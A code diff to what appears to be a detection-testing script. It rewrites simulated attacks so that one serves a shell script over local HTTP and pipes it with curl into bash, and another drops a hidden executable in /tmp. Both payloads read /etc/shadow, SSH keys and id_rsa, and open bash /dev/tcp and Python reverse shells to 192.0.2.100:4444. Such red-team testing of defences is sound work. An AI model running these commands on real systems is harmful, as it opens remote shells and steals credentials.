@@ -885,28 +885,58 @@ def attack_sensitive_dir_traversal():
                 len(out.splitlines()) if out else 0)
 
 def attack_curl_pipe_bash():
-    """Write a shell script to disk, then curl file:// | bash — real shell execution via the pipe."""
-    script_path = os.path.join(tempfile.gettempdir(), f".update_{random.randint(1000, 9999)}.sh")
+    """Serve a shell script over a local HTTP server, then curl http:// | bash.
+
+    file:// URLs don't generate network telemetry — the detection fires on the
+    http:// download combined with bash execution, not on file reads.
+    """
+    import http.server
+    import socketserver
+
+    host = "192.0.2.100"
     script_content = (
         "#!/bin/bash\n"
         "id; whoami; uname -a\n"
         "cat /etc/passwd | head -5\n"
         "cat /etc/shadow 2>/dev/null | head -3\n"
         "ls -la ~/.ssh 2>/dev/null\n"
-        "find /tmp -type f -newer /etc/passwd 2>/dev/null\n"
-    )
-    log.warning("%s curl-pipe-bash — write script to %s, curl file:// | bash", _tag("TEST-ATTACK"), script_path)
+        f"bash -i >& /dev/tcp/{host}/4444 0>&1\n"
+        f"python3 -c 'import socket,subprocess,os;"
+        f"s=socket.socket();s.connect((\"{host}\",4444));"
+        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+        f"subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null\n"
+    ).encode()
+
+    port = random.randint(18000, 19999)
+
+    class _Handler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(script_content)
+        def log_message(self, *args):
+            pass
+
     try:
-        with open(script_path, "w") as f:
-            f.write(script_content)
-        os.chmod(script_path, 0o755)
-        rc, out = run_cmd(["bash", "-c", f"curl -s file://{script_path} | bash"], timeout=15)
+        srv = socketserver.TCPServer(("127.0.0.1", port), _Handler)
+    except OSError:
+        log.warning("%s curl-pipe-bash — could not bind port %d, skipping", _tag("TEST-ATTACK"), port)
+        return
+
+    t = threading.Thread(target=srv.serve_forever)
+    t.daemon = True
+    t.start()
+
+    log.warning("%s curl-pipe-bash — http://127.0.0.1:%d/update.sh | bash", _tag("TEST-ATTACK"), port)
+    try:
+        rc, out = run_cmd(
+            ["bash", "-c", f"curl -s http://127.0.0.1:{port}/update.sh | bash"],
+            timeout=15,
+        )
         log.warning("%s  rc=%d  out=%s", _tag("TEST-ATTACK"), rc, out[:120])
     finally:
-        try:
-            os.remove(script_path)
-        except OSError:
-            pass
+        srv.shutdown()
 
 
 def attack_reverse_shell_sim():
@@ -1013,8 +1043,10 @@ def attack_proc_access():
 
 
 def attack_hidden_payload_exec():
-    """Write a hidden (dot-prefix) executable to /tmp, run it, clean up — classic malware drop."""
+    """Write a hidden executable to /tmp containing a reverse shell — dropped malware IOA."""
     payload_path = os.path.join(tempfile.gettempdir(), f".svc_{random.randint(1000, 9999)}")
+    # Payload includes a reverse shell attempt — the same pattern Behavioral AI already catches.
+    # Executing this from a dropped dotfile is a stronger combined signal than a bare reverse shell.
     content = (
         "#!/bin/bash\n"
         "id; whoami\n"
@@ -1022,7 +1054,11 @@ def attack_hidden_payload_exec():
         "cat /etc/shadow 2>/dev/null | head -3\n"
         "ls -la /root 2>/dev/null\n"
         "cat ~/.ssh/id_rsa 2>/dev/null\n"
-        "find / -name '*.pem' -o -name '*.key' 2>/dev/null | head -5\n"
+        "bash -i >& /dev/tcp/192.0.2.100/4444 0>&1\n"
+        "python3 -c 'import socket,subprocess,os;"
+        "s=socket.socket();s.connect((\"192.0.2.100\",4444));"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+        "subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null\n"
     )
     log.warning("%s Hidden payload exec — write dotfile to /tmp, chmod+x, execute",
                 _tag("TEST-ATTACK"))
